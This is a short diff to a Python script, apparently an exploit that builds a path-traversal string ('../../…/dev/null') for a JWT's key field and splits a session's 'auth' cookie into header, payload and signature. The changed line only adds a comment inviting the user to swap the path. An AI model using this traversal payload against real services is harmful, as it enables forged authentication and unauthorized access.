@@ -21,7 +21,7 @@ s = req.Session()
 response = s.get(url)
 headers_info = s.cookies.get_dict()
 
-exploit = "../../../../../../../../../../dev/null"
+exploit = "../../../../../../../../../../dev/null" # you can change this path
 headers_components = ['header', 'payload', 'signature']
 space = headers_info['auth'].split('.')
 
